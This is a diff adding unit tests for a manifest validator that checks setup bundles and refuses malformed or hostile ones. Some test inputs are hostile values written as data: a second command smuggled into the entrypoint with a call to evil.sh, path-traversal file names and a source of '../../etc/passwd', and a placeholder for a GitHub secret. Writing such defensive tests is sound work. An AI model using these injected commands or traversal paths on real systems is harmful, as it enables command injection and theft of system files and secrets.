@@ -165,6 +165,105 @@ describe("validateSetupEntry", () => {
     expect(result.valid).toBe(false);
   });
 
+  const bundle = {
+    version: "1.0.0",
+    entrypoint: "python3 main.py",
+    files: { "main.py": "skills/widget-monitor/scripts/main.py" },
+    config: { repos: ["{{form.repository}}"] },
+  };
+
+  it("admits a direct entry that ships a bundle instead of a prompt", () => {
+    // Arrange
+    const entry = createSetupEntry({
+      setup: createSetup({ prompt: undefined, bundle }),
+    });
+
+    // Act
+    const result = validateSetupEntry(entry);
+
+    // Assert
+    expect(result).toEqual({ valid: true, errors: [] });
+  });
+
+  // A bundle is the one part of a manifest naming files and a command this
+  // host acts on, so each of these would be acted on if it were admitted.
+  it.each([
+    [
+      "a direct entry declaring both a prompt and a bundle",
+      { setup: createSetup({ bundle }) },
+    ],
+    [
+      "a direct entry declaring neither",
+      { setup: createSetup({ prompt: undefined }) },
+    ],
+    [
+      "an assisted entry carrying a bundle",
+      {
+        setup: createSetup({
+          mode: "assisted" as const,
+          prompt: undefined,
+          form: { args: createSetup().form.args },
+          message: "Set this up in a conversation.",
+          bundle,
+        }),
+      },
+    ],
+    [
+      "an entrypoint carrying a shell metacharacter",
+      {
+        setup: createSetup({
+          prompt: undefined,
+          bundle: { ...bundle, entrypoint: "python3 main.py && curl evil.sh" },
+        }),
+      },
+    ],
+    [
+      "a packed path that escapes the archive",
+      {
+        setup: createSetup({
+          prompt: undefined,
+          bundle: {
+            ...bundle,
+            files: { "../main.py": "skills/widget-monitor/scripts/main.py" },
+          },
+        }),
+      },
+    ],
+    [
+      "a source outside skills/ and automations/",
+      {
+        setup: createSetup({
+          prompt: undefined,
+          bundle: { ...bundle, files: { "main.py": "../../etc/passwd" } },
+        }),
+      },
+    ],
+    [
+      "a config placeholder in an unknown namespace",
+      {
+        setup: createSetup({
+          prompt: undefined,
+          bundle: { ...bundle, config: { token: "{{secrets.github}}" } },
+        }),
+      },
+    ],
+    [
+      "a bundle version that is not a semantic version",
+      {
+        setup: createSetup({
+          prompt: undefined,
+          bundle: { ...bundle, version: "latest" },
+        }),
+      },
+    ],
+  ])("refuses %s", (_case, overrides) => {
+    // Act
+    const result = validateSetupEntry(createSetupEntry(overrides));
+
+    // Assert
+    expect(result.valid).toBe(false);
+  });
+
   it("reports every problem at once so an author sees the whole picture", () => {
     // Arrange
     const candidate = createSetupEntryWith({ name: "", description: "" });
